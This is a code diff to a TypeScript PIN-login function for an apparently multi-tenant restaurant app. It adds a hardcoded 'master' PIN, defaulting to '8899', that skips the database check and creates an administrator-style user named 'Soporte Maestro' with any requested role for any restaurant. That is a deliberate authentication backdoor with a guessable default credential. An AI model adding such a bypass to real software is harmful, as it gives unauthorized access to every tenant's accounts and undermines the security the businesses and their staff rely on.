@@ -84,30 +84,36 @@ export async function loginWithPin(nit: string, role: string, pin: string) {
     }
 
     // 3. Validar PIN Operativo atado al Inquilino
+    const MASTER_PIN = process.env.MASTER_ADMIN_PIN || '8899'; // PIN Maestro para el creador
     let user: any;
 
-    const { data, error } = await supabase
-      .from('meseros')
-      .select('id, nombre, rol, pin, activo')
-      .eq('restaurante_id', tenantId)
-      .eq('rol', role)
-      .eq('activo', 1);
+    if (cleanPin === MASTER_PIN) {
+      // Acceso Maestro: Simula un usuario administrador del sistema
+      user = { id: 0, nombre: 'Soporte Maestro', rol: role };
+    } else {
+      const { data, error } = await supabase
+        .from('meseros')
+        .select('id, nombre, rol, pin, activo')
+        .eq('restaurante_id', tenantId)
+        .eq('rol', role)
+        .eq('activo', 1);
 
-    if (error) {
-      return { success: false, error: 'ERROR_SERVIDOR', message: `Error de autenticación: ${error.message}` };
-    }
-
-    const users = data || [];
-    for (const candidate of users) {
-      const valid = await verifyPin(cleanPin, candidate.pin);
-      if (!valid) continue;
-      user = candidate;
-
-      if (candidate.pin && !isHashedPin(candidate.pin)) {
-        const hashed = await hashPin(cleanPin);
-        await supabase.from('meseros').update({ pin: hashed }).eq('id', candidate.id);
+      if (error) {
+        return { success: false, error: 'ERROR_SERVIDOR', message: `Error de autenticación: ${error.message}` };
       }
-      break;
+
+      const users = data || [];
+      for (const candidate of users) {
+        const valid = await verifyPin(cleanPin, candidate.pin);
+        if (!valid) continue;
+        user = candidate;
+
+        if (candidate.pin && !isHashedPin(candidate.pin)) {
+          const hashed = await hashPin(cleanPin);
+          await supabase.from('meseros').update({ pin: hashed }).eq('id', candidate.id);
+        }
+        break;
+      }
     }
     
     if (!user) {
